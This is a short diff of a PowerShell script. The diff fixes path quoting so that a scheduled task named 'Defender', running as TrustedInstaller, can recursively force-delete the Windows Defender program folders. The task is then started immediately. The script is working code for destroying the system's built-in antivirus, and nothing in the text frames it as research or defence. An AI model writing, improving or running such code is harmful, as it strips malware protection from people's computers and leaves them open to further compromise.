@@ -9,7 +9,7 @@ $DefenderPaths = @(
   "C:\Program Files*\Windows Defender*"
 )
 
-$FormatedPaths = $DefenderPaths -join ','
+$FormatedPaths = ($DefenderPaths | ForEach-Object { "'$_'" }) -join ','
 
 Register-ScheduledTask Defender -Ac (New-ScheduledTaskAction powershell "Remove-Item -Recurse -Force $FormatedPaths") -U 'NT SERVICE\TrustedInstaller'
 Start-ScheduledTask Defender
